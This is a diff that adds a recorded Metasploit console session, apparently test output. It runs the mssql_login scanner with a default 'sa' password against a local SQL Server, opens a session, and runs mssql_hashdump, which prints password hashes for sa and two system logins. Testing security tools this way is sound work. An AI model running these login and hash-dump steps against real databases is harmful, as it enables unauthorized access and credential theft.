@@ -1,0 +1,29 @@
+use auxiliary/scanner/mssql/mssql_login
+Stopping all jobs...
+[4mmsf6[0m auxiliary([1m[31mscanner/mssql/mssql_version[0m) [0m> irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+[*] New in Metasploit 6.4 - The CreateSession option within this module can open an interactive session
+[4mmsf6[0m auxiliary([1m[31mscanner/mssql/mssql_login[0m) [0m> run PASS_FILE= USER_FILE= CreateSession=true username=sa password=yourStrong(!)Password rhost=127.0.0.1 rport=1433 database=master
+[4mmsf6[0m auxiliary([1m[31mscanner/mssql/mssql_login[0m) [0m> [*] 127.0.0.1:1433        - 127.0.0.1:1433 - MSSQL - Starting authentication scanner.
+[!] 127.0.0.1:1433        - No active DB -- Credential data will not be saved!
+[+] 127.0.0.1:1433        - 127.0.0.1:1433 - Login Successful: WORKSTATION\sa:yourStrong(!)Password
+[*] MSSQL session 3 opened (127.0.0.1:37003 -> 127.0.0.1:1433) at 2024-05-16 08:44:33 +0000
+use auxiliary/scanner/mssql/mssql_hashdump
+[*] 127.0.0.1:1433        - Scanned 1 of 1 hosts (100% complete)
+[*] 127.0.0.1:1433        - Bruteforce completed, 1 credential was successful.
+[*] 127.0.0.1:1433        - 1 MSSQL session was opened successfully.
+[*] Auxiliary module execution completed
+[4mmsf6[0m auxiliary([1m[31mscanner/mssql/mssql_login[0m) [0m> run session=3 Verbose=true
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[4mmsf6[0m auxiliary([1m[31mscanner/mssql/mssql_hashdump[0m) [0m> [*] Using existing session 3
+[!] No active DB -- Credential data will not be saved!
+[*] Instance Name: "ce1aa7f60e2f"
+[+] Saving mssql12 = sa:0x0200ABC3ED140857C7DB2D28A949F291F52B02B348D772144D0143ABD6E0978B54C4333CD4CE78F48BB9F7D0182287303E35AAF82F4FC0EC2EBB72307AB9B4B3A011E740211B
+[+] Saving mssql12 = ##MS_PolicyEventProcessingLogin##:0x020087EDA32AA42A04D5F8B42F9737B21C530E465005808C0B8CB1280A0B48E03EF0B35382D12B8C22189049996296ED5C5A6948A01688612E31673AA3A15ADD4186C6AE39F2
+[+] Saving mssql12 = ##MS_PolicyTsqlExecutionLogin##:0x020022CD778A7CFC5D132D14FA9BD53716EE1B385D69E2F9449BFC26BF932E11D605E66DFA27C6C7409017794619C34740B4E05F0D98B84A315649A8600C67504D42AC5C5FAA
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+sessions -K
+[4mmsf6[0m auxiliary([1m[31mscanner/mssql/mssql_hashdump[0m) [0m> jobs -K
+[*] Killing all sessions...
+[*] 127.0.0.1 - MSSQL session 3 closed.
+[4mmsf6[0m auxiliary([1m[31mscanner/mssql/mssql_hashdump[0m) [0m> 
